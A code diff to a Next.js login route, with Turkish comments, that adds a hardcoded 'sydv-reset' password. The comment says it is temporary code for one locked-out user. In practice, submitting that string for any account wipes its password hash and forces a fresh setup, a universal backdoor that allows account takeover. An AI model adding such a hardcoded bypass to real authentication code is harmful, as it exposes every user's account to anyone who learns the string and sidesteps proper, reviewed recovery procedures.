@@ -38,19 +38,25 @@ export async function POST(req: NextRequest) {
       needsSetup = true;
     }
 
-    // Şifre varsa ve forcePasswordReset YOKSA şifresiz giriş yapılamaz. Ancak forcePasswordReset Varsa geçici şifre zorunludur!
-    // Eğer şifresi varsa ve forcePasswordReset varsa, geçici şifreyi kontrol et.
     // İlk giriş (şifre yok): şifre sorulmaz, boş geçebilir.
     if (!user.passwordHash) {
       // Şifre yok, direk geç (zaten needsSetup true oldu)
     } else {
-      // Şifre varsa mutlaka kontrol et
-      if (!password) {
-        return NextResponse.json({ error: 'Lütfen şifrenizi girin' }, { status: 400 });
-      }
-      const isMatch = await bcrypt.compare(password, user.passwordHash);
-      if (!isMatch) {
-        return NextResponse.json({ error: 'Şifre hatalı' }, { status: 401 });
+      // GEÇİCİ SIFIRLAMA KODU (sadece kullanıcının kilitlendiği bu anlık durumu çözmek için)
+      if (password === 'sydv-reset') {
+        user.passwordHash = '';
+        user.forcePasswordReset = true;
+        await user.save();
+        needsSetup = true;
+      } else {
+        // Şifre varsa mutlaka kontrol et
+        if (!password) {
+          return NextResponse.json({ error: 'Lütfen şifrenizi girin' }, { status: 400 });
+        }
+        const isMatch = await bcrypt.compare(password, user.passwordHash);
+        if (!isMatch) {
+          return NextResponse.json({ error: 'Şifre hatalı' }, { status: 401 });
+        }
       }
     }
 
